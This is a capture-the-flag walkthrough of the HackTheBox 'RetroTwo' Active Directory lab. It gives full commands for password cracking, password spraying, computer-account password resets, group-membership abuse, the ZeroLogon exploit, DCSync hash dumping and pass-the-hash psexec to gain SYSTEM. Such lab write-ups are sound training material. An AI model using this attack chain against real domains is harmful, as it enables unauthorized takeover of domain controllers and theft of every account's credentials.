# [HackTheBox - RetroTwo](https://app.hackthebox.com/machines/RetroTwo)

![8afdd199ef4bc8bc1460e9286069df16.png](/resources/8afdd199ef4bc8bc1460e9286069df16.png)

## Table of Contents

- [Abstract](#abstract)
- [Enumeration](#enumeration)
- [Obtaining ldapreader user from Microsoft Access database file](#obtaining-ldapreader-user-from-microsoft-access-database-file)
- [Initial Access with GenericWrite and AddMember rights](#initial-access-with-genericwrite-and-addmember-rights)
- [Privilege Escalation with ZeroLogon](#privilege-escalation-with-zerologon)

***
## Abstract
RetroTwo is a vulnlab machine imported to HackTheBox as a easy Windows Active Directory box, I started with network enumeration with nmap, revealing this machine is a domain controller and no extra service running on this machine.

On the enumeration phase, I discovered that guest account is enabled and can access public file share that contains Microsoft Access database file that has credential of ldapreader user inside it but since this file is locked so I cracked it with John The Ripper and finally retrieved the valid domain user credential. 

After obtaining valid domain user, I discovered 2 Pre-2000 computer (Pre2k) accounts that have GenericWrite over another computer machine account that can add member to the services group which can access to the domain controller with RDP so I changed the password of that computer account and add one of pre2k computer account to the services group and foothold via RDP.

Lastly, I used ZeroLogon to remove password of the domain controller computer account and dump all hashes with DCSync attack and finally root the box with impacket psexec.

## Enumeration
I start with nmap scan without any flag to quickly scan for well-known port which reveals that this machine is a domain controller and does not have any services beside required services for active directory running on this machine and one more thing to notice here is no port 5985 which mean we can not use WinRM to get access to this machine.

![6c09a017b916d2c6aaaec10ac236d2b5.png](/resources/6c09a017b916d2c6aaaec10ac236d2b5.png)

I rerun my scan again with `-sCV` just to find the hostname which I'll add to my `/etc/hosts` file so I won't need to specify IP address if I did not need to but the result show me that the server is using Windows 2008 R2 which is very old so privilege escalation should be easy if it did not patch properly.

![8f7c169e233dfbfb52cc08d0fc9b5fdc.png](/resources/8f7c169e233dfbfb52cc08d0fc9b5fdc.png)

When dealing with domain controller, I always check with null session and guest account first if I can pull user list and access to any share with any of them which I discover that guest account is enabled on domain and it can access to "Public" share.

```
uv run nxc smb retro2.vl -u 'guuest' -p '' --users --shares
```
![181e7f5f634bce6e4b00e139194b50d4.png](/resources/181e7f5f634bce6e4b00e139194b50d4.png)

## Obtaining ldapreader user from Microsoft Access database file

On this public share, I discover Microsoft Access Database file that is locked with a password. 

```
smbclient \\\\retro2.vl\\Public -N
recurse on
ls
```
![4fe6b4b0d5cdbe04dbbc286883306e8f.png](/resources/4fe6b4b0d5cdbe04dbbc286883306e8f.png)

![f887fb8e4002bcb47d71c7c82de02bcd.png](/resources/f887fb8e4002bcb47d71c7c82de02bcd.png)

To crack any of Microsoft Office suite (including Microsoft Access), I use `office2john` to generate crackable hash with John The Ripper which I finally obtain the password of this file after a few seconds.

```
office2john staff.accdb > staff.hash
john --wordlist=/usr/share/wordlists/rockyou.txt staff.hash
```
![8bb852b4ff2d522704abd7a026e98849.png](/resources/8bb852b4ff2d522704abd7a026e98849.png)

Upon unlocking the file, I did not find anything useful yet but there is a Staff module that I want to look into.

![9165178e3cbb731510cbe2780c8db087.png](/resources/9165178e3cbb731510cbe2780c8db087.png)

Inside this module, contain user credential of "ldapreader" user so I will use it to further enumerate the domain after confirming that this password can be used.

![697318d2c7d56f47d55c989fa2451204.png](/resources/697318d2c7d56f47d55c989fa2451204.png)

I use RID-Cycling method to pull user list from the domain first.

```
uv run nxc smb retro2.vl -u 'guest' -p '' --rid-brute | grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1 | tee rt2_users
```
![3392d04ffbd21d0b3dc680087003d0cc.png](/resources/3392d04ffbd21d0b3dc680087003d0cc.png)

Now I can conduct password spraying attack to find if this credential can be used with other account but look like only its only valid for ldapreader user. 

```
uv run nxc smb retro2.vl -u rt2_users  -p 'ppYaVcB5R' --continue-on-success
```
![8e4a19822f37246548519b2272b66aec.png](/resources/8e4a19822f37246548519b2272b66aec.png)

Knowing the name of this lab, I know that on the Retro lab. there is a Pre2K computer machine account that can be abused so I use the same module to find them and this time, I have 2 Pre2k computer accounts that can be abused. 

```
uv run nxc ldap retro2.vl -u ldapreader  -p 'ppYaVcB5R' -M pre2k
```
![8a1deb34a7dd086577e05fef19840f94.png](/resources/8a1deb34a7dd086577e05fef19840f94.png)

With valid domain credential, I use bloodhound-python to collect domain information to visualise in bloodhound community edition. 

```
bloodhound-python -u 'ldapreader' -p 'ppYaVcB5R' -d retro2.vl -c all -ns 10.129.100.121 --zip
```
![dc7b9a95cbd402fbdfacd618a79b5e4d.png](/resources/dc7b9a95cbd402fbdfacd618a79b5e4d.png)


## Initial Access with GenericWrite and AddMember rights

From the bloodhound, I found that both Pre2K accounts I found earlier are the member of "Domain Computers" group which has GenericWrite permission over "ADMWS01$" computer account, and this computer account has can add itself and other to "Services" group which is the member of Remote Desktop Users.

So to summarize the attack chain to get a foothold, I'll change the password of "ADMWS01$" computer account and add any of user that I have user credential to Services group and connect to the domain controller via RDP

![f6f2ba3a98610474eabbc1aad8114267.png](/resources/f6f2ba3a98610474eabbc1aad8114267.png)

First, I use `impacket-changepasswd` to change password of Pre2K computer account first to make it usable and thenn use `impacker-addcomputer` to change password of "ADMWS01$" computer account.

```
impacket-changepasswd retro2.vl/fs01\$:fs01@retro2.vl -newpass '12345' -p rpc-samr
impacket-addcomputer -computer-name 'ADMWS01$' -computer-pass '12345' -no-add 'retro2.vl/FS01$:12345'
```

![16cf9a0b5c0b5c777276a977aacdc02f.png](/resources/16cf9a0b5c0b5c777276a977aacdc02f.png)

I'll add ldapreader to Services group and now I should be able to access to the domain controller via RDP.

```
bloodyAD -d retro2.vl --host BLN01.retro2.vl -u 'ADMWS01$' -p 12345 add groupMember Services ldapreader
```

Using xfreerdp, I can connect to the domain controller as get user flag located at the root of C drive

```
xfreerdp /u:ldapreader /p:ppYaVcB5R /v:retro2.vl /tls-seclevel:0 /cert-ignore /dynamic-resolution
```

![dd74c65a3ff74e87fc95a6063e68b194.png](/resources/dd74c65a3ff74e87fc95a6063e68b194.png)

## Privilege Escalation with ZeroLogon

The privilege escalation on this box is to use [Perfusion](https://github.com/itm4n/Perfusion), that will automatically exploited weak permission on "RpcEptMapper" and "DnsCache" service to create a new subkey and load arbitrary DLL in the context of WMI service as NT AUTHORITY\SYSTEM but I do not wish to debug this so I will use another way to root the box.

![717b06c051710174c14c2f11533f51c7.png](/resources/717b06c051710174c14c2f11533f51c7.png)

Since this Windows Server is fairly old then I will use [ZeroLogon](https://github.com/dirkjanm/CVE-2020-1472) to exploit this instead, which I cloned the github repository of the PoC script then run the script to password of the domain controller account (or remove it in the sense)

```
git clone https://github.com/dirkjanm/CVE-2020-1472.git
cd CVE-2020-1472
python cve-2020-1472-exploit.py bln01 10.129.100.121
```
![ba08c0dd8d7b54b2e9edaafde40ee034.png](/resources/ba08c0dd8d7b54b2e9edaafde40ee034.png)

Now I can use `impacket-secretsdump` to conduct DCSync attack.

```
impacket-secretsdump -just-dc -no-pass 'bln01$@retro2.vl'
```
![233e8e2d14678230bae5b43612023e37.png](/resources/233e8e2d14678230bae5b43612023e37.png)

With the administrator hash, I use `impacket-psexec` to gain access to the domain controller as SYSTEM.

```
impacket-psexec 'Administrator@retro2.vl' -hashes :c06552bdb50ada21a7c74536c231b848 -service-name chicken_svc -remote-binary-name powershell.exe
```
![ff8d302d88d79058c5e29c146cd8f919.png](/resources/ff8d302d88d79058c5e29c146cd8f919.png)

Now I can loot the root flag and root the box :D

![c253d6b02680fac5ce8fc88644f97e18.png](/resources/c253d6b02680fac5ce8fc88644f97e18.png)

![503157139e6c2416c4a2781e19e149ba.png](/resources/503157139e6c2416c4a2781e19e149ba.png)

https://labs.hackthebox.com/achievement/machine/1438364/685
***